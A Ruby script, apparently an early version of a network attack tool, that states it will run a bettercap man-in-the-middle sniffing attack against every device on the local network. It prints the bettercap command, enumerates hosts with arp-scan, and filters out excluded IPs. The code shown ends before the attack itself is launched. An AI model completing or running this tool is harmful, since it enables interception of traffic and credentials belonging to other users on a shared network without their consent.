#!/usr/bin/ruby
require 'ostruct'
require "yaml"
config=YAML.load_file('./config.yaml')
#SOME INIT
puts "----Network Traker----"
puts "Secure Network this program will perform a MITM Attack without ssl script against every device in network using bettercap sudo bettercap -G GATEWAY --target DEVICE_IP --no-discovery  --sniffer"

#TAKE SOME CONFIGURATION from YAML
#GATEWAY IP
gateway_ip=config['GATEWAY']
#gateway ip can be given as param
if ARGV.empty?
  puts"Ther's no arguments->OK"
else
  if ARGV[0]!=""
    gateway_ip=ARGV[0];
  end
end

#EXCLUDED IP
excluded_devices=config['EXCLUDED_DEVICES']

#CHECK FORM REQUIRED SOFTWARE INSTALLATION
#check for bettercap installation

if(%x(gem list | grep 'bettercap' -c).to_i < 1)
  puts"Error: Bettercap must be installed as gem"
  abort("Error: Bettercap must be installed as gem")
else
	puts "Bettercap finded! "
end
#check for arp-scan installation
if(%x(./is_installed.sh arp-scan).to_i != 0)
  puts"Error: arp-scan must be installed as gem"
  abort("Error: arp-scan must be installed as gem")
else
	puts"arp-scan finded!"
end
#START
puts"Let's start discovering your network..."
#Discover devices in network
cmd="sudo arp-scan --localnet |grep -E '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b'"
value=%x[ #{cmd} ]
puts "Founded devices:"

Devices=Array.new
value.each_line do |line|
    #split each line to collet IP MAC NAME
	device=OpenStruct.new 
	device.ip=line.split(' ')[0]
	device.mac=line.split(' ')[1]
	device.name=line.split(' ')[2]
	Devices<<device
end

puts "---- DEVICE LIST----"
Devices.each{|a| puts a}

puts "cleaning Device list..."
Devices.delete_if{|device| excluded_devices.include? (device.ip)}

puts "---- NEW DEVICES LIST----"
Devices.each{|a| puts a}


#fork{exec("ls")}
